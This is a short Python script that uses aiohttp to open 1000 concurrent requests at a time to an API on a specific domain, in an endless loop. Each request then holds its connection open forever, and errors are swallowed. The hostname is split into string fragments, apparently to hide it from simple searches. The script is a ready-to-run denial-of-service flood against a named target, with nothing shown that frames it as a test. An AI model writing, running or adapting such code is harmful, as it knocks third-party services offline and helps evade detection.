import asyncio
import uuid

import aiohttp


async def task():
    try:
        async with aiohttp.ClientSession() as session:
            r = await session.get("https://auc" + "tions.cr" + "aft" + "lin" + "k.xyz/ap" + "i/wort" + f"h/{uuid.uuid4().hex}")
            print(await r.text())
            await asyncio.sleep(float("inf"))
    except:
        pass


loop = asyncio.get_event_loop()

while True:
    coroutines = [task() for _ in range(1000)]
    tasks = asyncio.gather(*coroutines)

    loop.run_until_complete(tasks)
